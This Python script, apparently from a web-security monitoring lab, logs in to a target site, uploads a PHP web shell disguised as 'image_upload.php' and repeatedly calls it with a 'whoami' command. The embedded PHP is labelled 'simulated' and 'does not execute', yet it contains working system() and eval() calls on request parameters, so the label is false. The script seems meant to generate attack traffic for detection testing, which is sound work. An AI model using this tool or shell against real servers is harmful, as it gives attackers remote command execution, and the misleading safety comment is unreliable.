"""
webshell.py — Web Shell Upload & Access Attack
Web Security Monitoring Project
LOCAL LAB USE ONLY. Only ever point this at machines you own/control.
"""

import argparse
import sys
import time
import requests

DEFAULT_TARGET = "http://127.0.0.1:5000"

WEBSHELL_CONTENT = b"""<?php
// simulated web shell payload - lab use only, does not execute
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
eval($_REQUEST['x']);
?>
"""


def login(session, target_url, username, password):
    resp = session.post(
        f"{target_url}/login",
        data={"username": username, "password": password},
        allow_redirects=False,
    )
    if resp.status_code != 302:
        print(f"[!] Login failed for {username}:{password} (status {resp.status_code})")
        sys.exit(1)
    print(f"[+] Logged in as {username}")


def upload_webshell(session, target_url, filename):
    files = {"file": (filename, WEBSHELL_CONTENT, "application/x-php")}
    resp = session.post(f"{target_url}/upload", files=files)
    if resp.status_code == 200:
        print(f"[+] Uploaded web shell: {filename}")
    else:
        print(f"[!] Upload failed (status {resp.status_code})")
        sys.exit(1)


def access_webshell(session, target_url, filename, hits, delay):
    url = f"{target_url}/uploads/{filename}"
    print(f"[*] Accessing {url} {hits} times...")
    for i in range(1, hits + 1):
        resp = session.get(url, params={"cmd": "whoami"})
        print(f"[{i}/{hits}] GET {url} -> {resp.status_code}")
        if delay:
            time.sleep(delay)


def main():
    parser = argparse.ArgumentParser(description="Upload + access a simulated web shell")
    parser.add_argument("-t", "--target", default=DEFAULT_TARGET,
                         help=f"Target base URL, e.g. http://192.168.1.11:5000 (default: {DEFAULT_TARGET})")
    parser.add_argument("-u", "--username", default="admin")
    parser.add_argument("-p", "--password", default="Summer2027!")
    parser.add_argument("-f", "--filename", default="image_upload.php")
    parser.add_argument("-n", "--hits", type=int, default=8)
    parser.add_argument("-d", "--delay", type=float, default=0.0)
    args = parser.parse_args()

    target_url = args.target.rstrip("/")
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = f"http://{target_url}"
    session = requests.Session()

    print(f"[*] Target: {target_url}\n")
    login(session, target_url, args.username, args.password)
    upload_webshell(session, target_url, args.filename)
    access_webshell(session, target_url, args.filename, args.hits, args.delay)

    print(f"\n[+] Done. Web shell '{args.filename}' uploaded and accessed {args.hits} times.")


if __name__ == "__main__":
    main()
